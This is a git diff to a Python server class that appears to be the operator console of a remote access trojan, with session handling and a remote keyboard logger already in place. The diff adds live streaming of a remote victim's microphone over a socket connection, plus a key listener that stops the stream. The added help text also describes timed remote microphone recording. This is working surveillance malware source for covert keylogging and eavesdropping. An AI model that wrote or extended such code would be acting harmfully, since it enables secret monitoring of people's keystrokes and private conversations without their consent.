@@ -10,8 +10,9 @@ from getpass import getuser
 from pickle import loads, dumps
 from pathlib import Path
 from time import sleep, time
-from sounddevice import InputStream, play, wait
+from sounddevice import RawOutputStream
 from soundfile import write as soundwrite
+from pynput.keyboard import Listener, KeyCode
 from numpy import load as npload
 from io import BytesIO
 from rich.progress import BarColumn, Progress, TimeRemainingColumn
@@ -106,7 +107,7 @@ class Server(object):
                 received = self.getCurrentUser()['conn'].recv(header['bytes'])
                 processList += received
                 progress.update(task, advance=len(received))
-        
+
         return loads(processList)
 
     # starting the keyboard logger
@@ -152,13 +153,36 @@ class Server(object):
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
             printr(f'Info: Stop the keyboard listener and save the captured keys.')
+    
+    # checking if was pressed Q key to stop microphone audio streaming
+    def checkStopMicStreamKey(self, key):
+        if isinstance(key, KeyCode):
+            if key.char == 'q':
+                self.getCurrentUser()['conn'].send(b'/micstreamstop')
+                self.keyboardListener.stop()
+    
+    # receiving and play sound frames from the microphone streaming
+    def receiveMicStreamFrames(self):
+        self.keyboardListener = Listener(on_press=self.checkStopMicStreamKey)
+        self.keyboardListener.start() # for when you wish to stop microphone stream
+
+        microphoneStream = RawOutputStream(channels=2, samplerate=44100)
+        microphoneStream.start()
+        
+        while True:
+            frame = self.getCurrentUser()['conn'].recv(32768)
+            if frame != b'/micstreamstop':
+                microphoneStream.write(frame)
+            else:
+                microphoneStream.stop()
+                break
 
     def micStream(self, args):
         if self.userAttached:
             self.sendLastCommand()
             try:
-                # here
-                pass
+                printr('[yellow] If you want to stop stream press [red]"q"')
+                self.receiveMicStreamFrames()
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -181,7 +205,7 @@ class Server(object):
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
         else:
-            printr(f'Info: Stop the keyboard listener and save the captured keys.')
+            printr(f'Info: Starts to recording microphone audio during x (integer) seconds | Ex: /micrecord 5')
 
     # getting the current user who you are attached
     def getCurrentUser(self):
